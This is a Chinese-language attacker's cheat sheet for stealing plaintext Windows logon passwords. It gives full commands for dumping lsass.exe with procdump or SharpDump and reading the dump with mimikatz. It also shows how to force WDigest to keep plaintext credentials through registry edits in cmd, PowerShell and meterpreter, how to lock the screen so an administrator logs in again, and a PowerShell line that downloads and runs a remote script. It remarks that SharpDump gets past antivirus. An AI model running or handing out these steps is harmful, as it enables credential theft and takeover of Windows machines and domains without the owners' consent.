#tools 工具

https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump
https://github.com/gentilkiwi/mimikatz
https://www.cmd5.com


(注:必须使用管理员权限)
procdump64如果不是使用管理员模式运行cmd会报错,

在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。

当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。
但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）

以下是支持的系统:

Windows 7
Windows 8
Windows 8.1
Windows Server 2008
Windows Server 2012
Windows Server 2012R 2
原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码

利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。

抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码

procdump64.exe导出lsass.dmp
procdump64.exe -accepteula -ma lsass.exe lsass.dmp


使用本地的mimikatz.exe读取lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit"



我们可以通过修改注册表来让Wdigest Auth保存明文口令：
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f


开启Wdigest Auth

cmd

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

powershell

Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1

meterpreter

reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1
关闭Wdigest Auth

关闭命令如下：

cmd

reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f

powershell

Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0

meterpreter

reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0


强制锁屏

在开启 Wdigest Auth 后，需要管理员重新登录才能抓明文密码。

强制锁屏，让管理员重新登录。

cmd

rundll32 user32.dll,LockWorkStation

powershell

Function Lock-WorkStation 
{
$signature = @"
[DllImport("user32.dll", SetLastError = true)]
public static extern bool LockWorkStation();
"@
$LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru
$LockWorkStation::LockWorkStation() | Out-Null
}
Lock-WorkStation

powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://x.x.x.x/Lock-WorkStation.ps1');"
重新读取，可读到明文密码。



SharpDump+ mimikatz
项目地址：

https://github.com/GhostPack/SharpDump
编译生成的exe文件只有10KB左右，而且可过360。

用法：

1.在管理员权限下运行生成debug480.bin

修改debug480.bin为zip文件解压得到导出文件。

mimikatz加载dump文件

mimikatz.exe "sekurlsa::minidump debug480" "sekurlsa::logonPasswords full" "exit"


